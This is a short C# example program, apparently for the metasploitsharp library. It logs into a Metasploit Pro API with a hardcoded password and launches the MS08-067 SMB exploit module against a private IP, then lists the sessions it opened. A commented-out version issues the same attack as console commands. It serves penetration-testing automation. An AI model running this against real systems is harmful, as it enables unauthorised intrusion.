using System;
using metasploitsharp;
using System.Collections.Generic;

namespace ModuleExecuteExample
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession("metasploit", "-LG.\"9U5", "https://192.168.1.148:3790/api/1.1"))
			{
				if (string.IsNullOrEmpty(session.Token))
					throw new Exception("Login failed. Check credentials");
				
				using (MetasploitProManager manager = new MetasploitProManager(session))
				{
					Dictionary<object, object> options = new Dictionary<object, object>();
					
					options.Add("RHOST", "192.168.1.129");
					options.Add("RPORT", "445");
					
					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/msf08_067_netapi", options);
					
					foreach (KeyValuePair<object, object> pair in response)
						Console.WriteLine(pair.Key + ": " + pair.Value);
				
//					var response = manager.CreateConsole();
//					
//					foreach (var pair in response)
//						Console.WriteLine(pair.Key + ": " + pair.Value);
//					
//					string consoleID = response[(object)"id"] as string;
//					
//					response = manager.WriteToConsole(consoleID, "use exploit/windows/smb/ms08_067_netapi\n");
//					System.Threading.Thread.Sleep(600);
//					response = manager.WriteToConsole(consoleID, "set RHOST 192.168.1.129\n");
//					System.Threading.Thread.Sleep(600);
//					response = manager.WriteToConsole(consoleID, "exploit\n");
//					System.Threading.Thread.Sleep(600);
//					
//					manager.ReadConsole(consoleID);
					
					response = manager.ListSessions();
					
					System.Text.Encoding enc = System.Text.Encoding.ASCII;
					foreach (var pair in response)
						foreach (var p in pair.Value as Dictionary<object, object>)
							Console.WriteLine(enc.GetString(p.Key as byte[]) + ": "  + enc.GetString(p.Value as byte[]));
					
//					manager.DestroyConsole(consoleID);
				}
			}
		}
	}
}
